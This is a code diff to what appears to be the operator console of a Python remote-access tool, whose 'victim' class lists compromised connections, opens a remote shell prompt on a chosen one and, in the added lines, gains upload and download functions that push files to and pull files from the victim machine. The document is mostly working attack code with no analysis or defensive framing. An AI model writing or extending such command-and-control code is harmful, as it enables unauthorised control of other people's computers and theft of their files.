@@ -1,3 +1,4 @@
+from distutils.command.upload import upload
 import socket
 from Utilities.Logging.log import Log
 from threading import Thread
@@ -25,6 +26,26 @@ def reliable_recv(s):
             return json.loads(data)
         except ValueError:
             continue
+
+def upload_file(file_name,target):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
+
+def download_file(file_name,target):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+
 class victim:
 
     def use(self,args):
@@ -32,11 +53,19 @@ class victim:
         while True:
             try:
                 cmd = input(f'shell @{connections.index(conn)+1} # ').strip()
+                conn.send(cmd.encode())
+                args = cmd.split(' ')
                 if cmd == 'home':
                     Log.warning("Switching to home.")
                     break
-                reliable_send(conn, cmd)
-                print(reliable_recv(conn))
+                elif args[0] == 'upload':
+                    print("uploading...")
+                    upload_file(args[1],conn)
+                elif args[0] == 'download':
+                    print('downloading..')
+                    download_file(args[1],conn)
+                else:
+                    print(reliable_recv(conn))
             except Exception:
                 pos = connections.index(conn)
                 connections.pop(pos)
@@ -48,7 +77,8 @@ class victim:
         if args == 'devices':
             Log.info("Available devices are :")
             for _,i in enumerate(addresses):
-                print(f'\t[{_}]- {i[0]}:{i[1]}')
+                print(f'\t[{_+1}]- {i[0]}:{i[1]}')
+            print()
         else:
             Log.error(f"Unknown {args}")
 
@@ -57,8 +87,8 @@ class victim:
         print('\t [1] show devices -> displays all the available devices.')
         print('\t [2] home ->switch to home panel.')
         print('\t [3] use [N] ->switch to Nth connection.')
+        print()
         self.home()
-        
 
     def process(self,cmd):
         line = cmd.split()
